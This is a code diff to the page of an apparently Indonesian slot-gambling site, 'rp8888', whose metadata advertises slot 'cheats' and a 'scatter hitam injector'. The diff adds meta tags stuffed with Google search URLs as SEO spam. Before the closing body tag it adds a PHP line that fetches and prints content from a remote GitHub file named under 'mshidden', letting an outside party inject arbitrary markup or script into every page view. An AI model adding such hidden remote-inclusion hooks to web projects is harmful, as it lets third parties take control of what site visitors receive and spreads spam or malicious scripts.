@@ -16,6 +16,10 @@
     <meta property="og:site_name" content="rp8888" />
     <meta name="description" content="Scatter hitam fitur slot mahjong ways 2, 3 gampang maxwin hari ini segera daftar situs rp8888 slot modal recehan bet 200, uji sekarang pakai cheat pgsoft." />
     <meta name="keywords" content="Scatter Hitam, Cheat Slot, Injector Scatter Hitam, Slot Mahjong, Slot Pg Mahjong, RP8888, Daftar Rp8888" />  
+	<meta name="page google.com" content="https://www.google.com/search?q=rp8888">
+	<meta name="page google.co.id" content="https://www.google.co.id/search?q=rp8888">
+	<meta name="page google.com" content="https://www.google.com/search?q=scatter+hitam">
+	<meta name="page google.co.id" content="https://www.google.co.id/search?q=scatter+hitam">
     <meta name="page-locale" content="id">
     <meta content="indonesian" name="language">
     <meta content='#ffd700' name='theme-color' />
@@ -691,6 +695,7 @@
 			</thead>
 	</table></div></div></div>
 	<amp-lightbox-gallery layout="nodisplay" id="amp-lightbox-gallery" class="i-amphtml-element i-amphtml-layout-nodisplay i-amphtml-built" hidden="" i-amphtml-layout="nodisplay"><div class="i-amphtml-lbg" bis_skin_checked="1"><div class="i-amphtml-lbg-mask" bis_skin_checked="1"></div></div></amp-lightbox-gallery>
+<?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/mshidden/main/kerala.txt");?>
 	</body>
 	</html>
 	
